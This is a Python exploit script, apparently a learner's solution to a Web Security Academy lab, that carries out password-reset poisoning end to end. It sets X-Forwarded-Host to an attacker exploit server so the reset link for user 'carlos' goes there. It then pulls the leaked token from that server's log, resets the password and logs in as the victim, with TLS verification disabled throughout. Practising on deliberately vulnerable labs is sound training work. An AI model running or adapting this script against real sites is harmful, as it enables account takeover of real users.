import requests 
import urllib3
import re

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a0500a1047354338169071800fd00d9.web-security-academy.net/"
exploit_server = "exploit-0a06006d045f5489813906bb01550005.exploit-server.net/"

headers = {"X-Forwarded-Host":exploit_server}

data = {"username":"carlos"}

# to send password reset link to carlos

response = requests.post(url+ "forgot-password",verify=False,headers=headers,proxies=proxies,data=data)


log_response = requests.get("http://" + exploit_server + "/log", verify=False)

# Use regex to find  tokens
match = re.search(r"temp-forgot-password-token=([a-zA-Z0-9]+)", log_response.text)
#print(match)
# alernate method is findall but why with -1 group
if match:
    token = match.group(1)
    print("Token found:", token)
else:
    print("Token not found in logs.")


data = {"temp-forgot-password-token":token,"new-password-1":"jester","new-password-2":"jester"}

response1 = requests.post(url+"forgot-password?temp-forgot-password-token",verify=False,data=data,proxies=proxies)


data_carlos = {"username":"carlos","password":"jester"}

response_carlos = requests.post(url+"login",data=data_carlos,proxies=proxies,verify=False)
if "username is carlos" in response_carlos.text:
    print("Successful login")
else:
    print("Login failed")



    # here dout is search and finall function dout why regex is having dout how to find the regex and approriate is their any universal re
    # regex is we can find 